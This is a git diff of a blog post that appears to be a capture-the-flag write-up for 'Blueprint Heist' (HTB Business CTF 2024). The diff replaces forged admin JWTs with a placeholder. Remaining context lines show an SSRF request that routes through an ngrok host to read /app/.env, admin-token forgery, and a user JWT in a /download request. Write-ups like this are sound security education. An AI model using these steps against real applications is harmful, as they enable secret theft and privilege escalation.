@@ -5,8 +5,7 @@ pubDate: 'may 22 2024'
 heroImage: '/luffy.png'
 ---
 
-> CHALLENGE NAME : Blueprint Heist
-> CTF            : HTB Business CTF 2024
+> CHALLENGE NAME : Blueprint Heist [HTB Business CTF 2024]
 
 
 ![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/1.jpeg)
@@ -280,7 +279,7 @@ url=http://ngrok_url/test.php?x=/app/.env
 ![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/real.jpeg)
 
 - Okay! we found the real secret key this time :D
-- Crafted the admin token and supplied to the endpoint `admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk`
+- Crafted the admin token and supplied to the endpoint `admin?token=<token>`
 
 ![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/internal.jpg)
 
@@ -297,7 +296,7 @@ const port = 1337;
 	app.listen(port, '0.0.0.0', ())
 ```
 
-- We can supply `http://0.0.0.0:1337/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk` in the url to see the response.
+- We can supply `http://0.0.0.0:1337/admin?token=<token>` in the url to see the response.
 
 ```
 POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
